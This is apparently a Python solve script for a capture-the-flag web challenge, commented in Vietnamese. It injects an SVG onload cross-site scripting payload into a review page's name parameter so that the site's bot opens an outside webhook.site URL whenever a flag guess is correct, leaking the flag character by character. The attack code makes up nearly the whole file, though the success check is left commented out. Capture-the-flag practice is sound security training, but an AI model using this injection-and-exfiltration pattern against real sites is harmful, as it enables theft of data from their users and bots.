import requests
import string
import time
from urllib.parse import quote

BASE_URL = "https://shadow-fight.ctf.prgy.in"
# Thay bằng link rút gọn trỏ về webhook của bạn
MY_SERVER = "https://webhook.site/b80bb90c-bbee-4612-8d18-1b7fbcd2a9d1" 
# Thay bằng API của webhook để check logs tự động (hoặc check tay)
WEBHOOK_API = "https://webhook.site/b80bb90c-bbee-4612-8d18-1b7fbcd2a9d1" 

chars = "_}" + string.ascii_lowercase + string.digits 
flag = "p_ctf{"

print(f"[*] Starting. Flag so far: {flag}")

while True:
    for c in chars:
        # Nếu tìm thấy chuỗi -> Bot mở link của bạn
        guess = flag + c
        payload = f"<svg onload=find('{guess}')&&open('{MY_SERVER}')>"
        
        target_url = f"{BASE_URL}/review?name={quote(payload)}&avatar=https://picsum.photos/200"
        
        try:
            # Gửi request để kích hoạt bot
            requests.post(target_url)
            
            # Đợi một chút để bot chạy và gửi request về webhook
            print(f"Testing: {c}", end='\r')
            time.sleep(2) 
            
            # Check webhook xem có request nào mới tới không
            # (Bạn có thể check bằng mắt hoặc code check API của webhook)
            # Giả sử logic check ở đây:
            # if check_webhook_has_new_request():
            #     flag += c
            #     print(f"\n[+] Found: {flag}")
            #     break
            
        except Exception as e:
            pass